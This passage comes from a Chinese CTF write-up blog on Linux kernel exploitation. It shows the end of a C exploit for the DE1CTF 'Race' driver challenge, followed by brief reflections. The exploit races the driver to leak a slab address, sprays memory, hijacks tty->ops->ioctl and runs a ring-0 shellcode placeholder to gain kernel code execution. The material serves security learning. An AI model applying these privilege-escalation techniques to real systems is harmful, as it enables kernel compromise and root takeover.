class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *mp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">data_struct</span> <span class="title">data</span>;</span></span><br><span class="line">	<span class="keyword">pthread_t</span> tid[thread_num];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x2c0</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="string">'a'</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="keyword">if</span> ((mp = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span> )) == MAP_FAILED)</span><br><span class="line">                error_quit(<span class="string">"mmap error"</span>);</span><br><span class="line">	data.size = <span class="number">0x2c0</span>;</span><br><span class="line">	data.buf = (<span class="keyword">void</span> *)buf;</span><br><span class="line">	ioctl(fd, test_ioctl_read, &amp;data);</span><br><span class="line">	data.size = <span class="number">7</span>;</span><br><span class="line">	data.buf = mp;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		<span class="keyword">if</span> (pthread_create(&amp;tid[i], <span class="literal">NULL</span>, race_kill, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">			error_quit(<span class="string">"pthread_create error"</span>);</span><br><span class="line">	ioctl(fd, test_ioctl_write, &amp;data);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		pthread_join(tid[i],<span class="literal">NULL</span>);</span><br><span class="line">	data.size = <span class="number">0x2c0</span>;</span><br><span class="line">	ioctl(fd, test_ioctl_read, &amp;data);</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)mp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_through</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> write_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> wfd;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf;</span><br><span class="line">	ret = posix_memalign((<span class="keyword">void</span> **)&amp;buf, <span class="number">512</span>, <span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		error_quit(<span class="string">"posix_memalign failed"</span>);</span><br><span class="line">	*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf = write_addr;</span><br><span class="line">	wfd = open(<span class="string">"./data"</span>, O_WRONLY | O_DIRECT | O_CREAT, <span class="number">0755</span>);</span><br><span class="line">	<span class="keyword">if</span> (wfd == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open data failed"</span>);</span><br><span class="line">	<span class="keyword">if</span> (write(wfd, buf, <span class="number">1024</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		error_quit(<span class="string">"write data failed"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(buf);</span><br><span class="line">	close(wfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">race_write</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">pthread_t</span> tid[thread_num];</span><br><span class="line">	<span class="keyword">int</span> wfd = open(<span class="string">"./data"</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span> (wfd == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open data failed"</span>);</span><br><span class="line">	<span class="keyword">char</span> *p = mmap(<span class="literal">NULL</span>,<span class="number">4096</span>,PROT_READ,MAP_PRIVATE,wfd,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (p == MAP_FAILED)</span><br><span class="line">		error_quit(<span class="string">"data mmap failed"</span>);</span><br><span class="line">	data.buf = (<span class="keyword">void</span> *)p;</span><br><span class="line">	data.size = <span class="number">0x2c0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		<span class="keyword">if</span> (pthread_create(&amp;tid[i], <span class="literal">NULL</span>, race_kill, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">			error_quit(<span class="string">"pthread_create error"</span>);	</span><br><span class="line">	ioctl(fd, test_ioctl_read, &amp;data);	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; thread_num; i++)</span><br><span class="line">		pthread_join(tid[i],<span class="literal">NULL</span>);</span><br><span class="line">	ptmx = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line">	close(wfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_spray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">void</span> *mp;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; i++)</span><br><span class="line">	&#123;</span><br><span class="line">        	<span class="keyword">if</span> ((mp = mmap(<span class="literal">NULL</span>, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span> )) == MAP_FAILED)</span><br><span class="line">                	error_quit(<span class="string">"mmap error"</span>);</span><br><span class="line">		<span class="built_in">memset</span>(mp, <span class="number">0</span>, mp_size);</span><br><span class="line">		spray[i] = mp;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> *<span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> *p = spray[i];</span><br><span class="line">		<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (j &lt; mp_size/<span class="number">8</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (p[j] != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> &amp;p[j];</span><br><span class="line">			j += <span class="number">512</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_ptmx_slave</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *pts_name;</span><br><span class="line">	<span class="keyword">if</span> (grantpt(ptmx) &lt; <span class="number">0</span> || unlockpt(ptmx) &lt; <span class="number">0</span>) </span><br><span class="line">		error_quit(<span class="string">"grantpt and unlockpt fail\n"</span>);</span><br><span class="line"></span><br><span class="line">	pts_name = (<span class="keyword">const</span> <span class="keyword">char</span> *)ptsname(ptmx);</span><br><span class="line">	<span class="keyword">int</span> fds = open(pts_name, O_RDONLY | O_NOCTTY);</span><br><span class="line">	<span class="keyword">if</span> (fds &lt; <span class="number">0</span>) </span><br><span class="line">		error_quit(<span class="string">"open /dev/ptmx fail\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> fds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// int t[0x100];</span></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/* for (i = 0; i &lt; 0x100; i++)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		t[i] = open("/dev/ptmx",O_RDWR);</span></span><br><span class="line"><span class="comment">		if (t[i] == -1)</span></span><br><span class="line"><span class="comment">			error_quit("open ptmx error");</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	for (i = 0; i &lt; 0x100; i++)</span></span><br><span class="line"><span class="comment">		close(t[i]);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> slab_addr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">	<span class="keyword">int</span> pts;</span><br><span class="line">        <span class="keyword">if</span> ((fd = open(<span class="string">"/dev/test"</span>,O_RDWR)) == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open test.ko error"</span>);</span><br><span class="line">	slab_addr = race_read();</span><br><span class="line">	<span class="keyword">if</span> (slab_addr &lt; <span class="number">0xff000000000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">		<span class="built_in">sprintf</span>(buf, <span class="string">"%s:0x%lx"</span>,<span class="string">"slab addr failed"</span>,slab_addr);</span><br><span class="line">		ex(buf);</span><br><span class="line">	&#125;</span><br><span class="line">	slab_addr = slab_addr | <span class="number">0xff00000000000000</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"slab_addr:0x%lx\n"</span>,slab_addr);</span><br><span class="line">	slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">	heap_spray();</span><br><span class="line">	write_through(slab_addr);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">while</span> (i++ &lt; <span class="number">0x1000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		race_write();</span><br><span class="line">		p = check();</span><br><span class="line">		<span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> get_root;</span><br><span class="line">		close(ptmx);</span><br><span class="line">	&#125;</span><br><span class="line">	ex(<span class="string">"physmap_addr not found"</span>);</span><br><span class="line">get_root:</span><br><span class="line">	kernel_base = p[<span class="number">3</span>] - kernel_offset;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"physmap_addr:%p = 0x%lx\n"</span>, p, slab_addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"kernel base:0x%lx\n"</span>, kernel_base);</span><br><span class="line">	pts = get_ptmx_slave();</span><br><span class="line">	p[<span class="number">3</span>] = slab_addr + <span class="number">0x300</span>;</span><br><span class="line">	p[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = kernel_base + set_memory_x;	<span class="comment">// tty-&gt;ops-&gt;ioctl = set_memory_x</span></span><br><span class="line">	ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);</span><br><span class="line">	p[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = slab_addr + <span class="number">0x400</span>;		<span class="comment">// tty-&gt;ops-&gt;ioctl = shellcode</span></span><br><span class="line">	<span class="built_in">memset</span>((<span class="keyword">char</span> *)p+<span class="number">0x400</span>, <span class="number">0x90</span>, <span class="number">0x100</span>);		<span class="comment">// place your shellcode here, it will run in ring0. gl hf.</span></span><br><span class="line">	getchar();</span><br><span class="line">	ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);	</span><br><span class="line">	close(fd);</span><br><span class="line">	close(pts);</span><br><span class="line">	close(ptmx);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>这种攻击非常非常类似于去年TSCTF鸡哥出的题，同样都是堆喷，同样都是改一个值之后爆破打印确定其位置，再次膜<code>w1tcher</code>和<code>p4nda</code>师傅。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章断断续续写了两个月大概，写kernel的exp太累，尤其是多线程/进程不好调试的题目，收获到了很多东西，todolist本来还有n1ctf的一道题，但是看了题解觉得自己的功力还不够，下一步的目标是复现两个想了很久的内核CVE。不知不觉已经正月十五了，寒假又废了，希望这俩CVE对我好一点qwq。</p>

      
    </div>

    

    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>您的支持将鼓励我继续创作</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay"/>
        <p>WeChat Pay</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay"/>
        <p>Alipay</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/09/03/KCTFQ3/" rel="next" title="KCTF 2019 Q3">
                <i class="fa fa-chevron-left"></i> KCTF 2019 Q3
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/09/03/kidding/" rel="prev" title="kidding">
                kidding <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/head.png"
                alt="ama2in9" />
            
              <p class="site-author-name" itemprop="name">ama2in9</p>
              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">70</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">33</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">4</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hwhxy.github.io/" title="HWHXY" target="_blank">HWHXY</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Kernel-Pwn从入门到放弃"><span class="nav-number">1.</span> <span class="nav-text">Kernel Pwn从入门到放弃</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#编译内核"><span class="nav-number">1.2.1.</span> <span class="nav-text">编译内核</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编译busybox"><span class="nav-number">1.2.2.</span> <span class="nav-text">编译busybox</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成文件系统"><span class="nav-number">1.2.3.</span> <span class="nav-text">生成文件系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu启动Linux-kernel"><span class="nav-number">1.2.4.</span> <span class="nav-text">qemu启动Linux kernel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb远程调试"><span class="nav-number">1.2.5.</span> <span class="nav-text">gdb远程调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在指定内核中编写驱动程序"><span class="nav-number">1.2.6.</span> <span class="nav-text">在指定内核中编写驱动程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调试"><span class="nav-number">1.2.7.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小知识"><span class="nav-number">1.2.8.</span> <span class="nav-text">小知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kernel-pwn保护机制"><span class="nav-number">1.2.9.</span> <span class="nav-text">kernel pwn保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#KASLR"><span class="nav-number">1.2.9.1.</span> <span class="nav-text">KASLR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMAP-SMEP"><span class="nav-number">1.2.9.2.</span> <span class="nav-text">SMAP/SMEP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Stack-Protector"><span class="nav-number">1.2.9.3.</span> <span class="nav-text">Stack Protector</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kernel-UAF"><span class="nav-number">1.3.</span> <span class="nav-text">Kernel UAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN-babydriver"><span class="nav-number">1.3.1.</span> <span class="nav-text">CISCN-babydriver</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#驱动逻辑"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">驱动逻辑</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编写exp"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">编写exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TSCTF2019-gt-babykernel"><span class="nav-number">1.3.2.</span> <span class="nav-text">TSCTF2019-&gt;babykernel</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序分析"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-c"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">exp.c</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kernel-ROP"><span class="nav-number">1.4.</span> <span class="nav-text">Kernel ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#QWB2018-Core"><span class="nav-number">1.4.1.</span> <span class="nav-text">QWB2018-Core</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找rops"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">寻找rops</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#调试-1"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-c-1"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">exp.c</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2usr"><span class="nav-number">1.5.</span> <span class="nav-text">ret2usr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.5.1.</span> <span class="nav-text">简介</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass-smep"><span class="nav-number">1.6.</span> <span class="nav-text">bypass smep</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介-1"><span class="nav-number">1.6.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN2017-BabyDriver"><span class="nav-number">1.6.2.</span> <span class="nav-text">CISCN2017-BabyDriver</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Fetch"><span class="nav-number">1.7.</span> <span class="nav-text">Double Fetch</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介-2"><span class="nav-number">1.7.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2018-0CTF-Finals-Baby-Kernel"><span class="nav-number">1.7.2.</span> <span class="nav-text">2018 0CTF Finals Baby Kernel</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-1"><span class="nav-number">1.7.2.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-c-2"><span class="nav-number">1.7.2.2.</span> <span class="nav-text">exp.c</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Heap-Overflow"><span class="nav-number">1.8.</span> <span class="nav-text">Heap Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介-3"><span class="nav-number">1.8.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUCTF-2019-sudrv"><span class="nav-number">1.8.2.</span> <span class="nav-text">SUCTF 2019 sudrv</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-3"><span class="nav-number">1.8.2.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-c-3"><span class="nav-number">1.8.2.2.</span> <span class="nav-text">exp.c</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl爆破cred地址"><span class="nav-number">1.9.</span> <span class="nav-text">prctl爆破cred地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介-4"><span class="nav-number">1.9.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xman结营赛-OOB"><span class="nav-number">1.9.2.</span> <span class="nav-text">xman结营赛 OOB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序分析-1"><span class="nav-number">1.9.2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-c-4"><span class="nav-number">1.9.2.2.</span> <span class="nav-text">exp.c</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用userfaultfd缺页扩大窗口期"><span class="nav-number">1.10.</span> <span class="nav-text">使用userfaultfd缺页扩大窗口期</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍"><span class="nav-number">1.10.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BalsnCTF2019-KrazyNote"><span class="nav-number">1.10.2.</span> <span class="nav-text">BalsnCTF2019 KrazyNote</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#背景知识"><span class="nav-number">1.10.2.1.</span> <span class="nav-text">背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#页和虚内存"><span class="nav-number">1.10.2.1.0.1.</span> <span class="nav-text">页和虚内存</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#页调度和延迟加载"><span class="nav-number">1.10.2.1.0.2.</span> <span class="nav-text">页调度和延迟加载</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#别名页"><span class="nav-number">1.10.2.1.1.</span> <span class="nav-text">别名页</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#userfaultfd机制"><span class="nav-number">1.10.2.1.2.</span> <span class="nav-text">userfaultfd机制</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-2"><span class="nav-number">1.10.2.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-4"><span class="nav-number">1.10.2.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-c-5"><span class="nav-number">1.10.2.4.</span> <span class="nav-text">exp.c</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dir"><span class="nav-number">1.11.</span> <span class="nav-text">ret2dir</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介-5"><span class="nav-number">1.11.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DE1CTF-Race"><span class="nav-number">1.11.2.</span> <span class="nav-text">DE1CTF Race</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序分析-amp-amp-漏洞利用"><span class="nav-number">1.11.2.1.</span> <span class="nav-text">程序分析 &amp;&amp; 漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-c-6"><span class="nav-number">1.11.2.2.</span> <span class="nav-text">exp.c</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#思考"><span class="nav-number">1.11.2.3.</span> <span class="nav-text">思考</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.12.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ama2in9</span>

  

  
</div>




  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
